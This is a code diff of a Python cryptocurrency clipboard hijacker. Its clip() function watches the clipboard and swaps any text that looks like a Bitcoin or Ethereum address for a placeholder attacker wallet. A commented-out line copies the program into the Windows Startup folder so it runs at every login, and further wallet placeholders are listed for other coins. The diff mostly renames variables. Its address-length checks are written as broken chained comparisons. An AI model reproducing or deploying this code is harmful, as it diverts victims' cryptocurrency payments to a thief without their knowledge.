@@ -4,19 +4,16 @@ from os import getcwd
 from shutil import copy
 
 #moves program to startup folder. rename file_name.exe
-#copy(getcwd()+'/python.exe','C:\Users\current_user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\')
 
-#created by courted#0001
-#types of btc addy
-# bc1, 1 ,3
-btc_address = "BTC WALLET HERE"
-eth_address = "ETH WALLET HERE"
+
+BTC_address = "BTC WALLET HERE"
+ETH_address = "ETH WALLET HERE"
 #coming soon?
-usdt_address = "USDT WALLET HERE"
-bnb_wallet = "BNB WALLET HERE"
-usdc_wallet = "USDC WALLET HERE"
-sol_wallet = "SOL WALLET HERE"
-xrp_wallet = "XRP WALLET HERE"
+USDT_address = "USDT WALLET HERE"
+BNB_wallet = "BNB WALLET HERE"
+USDC_wallet = "USDC WALLET HERE"
+SOL_wallet = "SOL WALLET HERE"
+XRP_wallet = "XRP WALLET HERE"
 
 def clip():
     s = str(pc.paste())
@@ -25,16 +22,16 @@ def clip():
     time.sleep(0.25)
     if s.startswith("1"):
         if length_of_s > 26 < 36:
-            pc.copy(btc_address)
+            pc.copy(BTC_address)
     elif s.startswith("bc1",0,3):
         if length_of_s > 26 < 36:
-            pc.copy(btc_address)
+            pc.copy(BTC_address)
     elif s.startswith("3"):
         if length_of_s > 26 < 36:
-            pc.copy(btc_address)
+            pc.copy(BTC_address)
     elif s.startswith("0x",0,2):
         if length_of_s > 20 < 40:
-            pc.copy(eth_address)
+            pc.copy(ETH_address)
     else:
         wallet_check = "ignore"
 
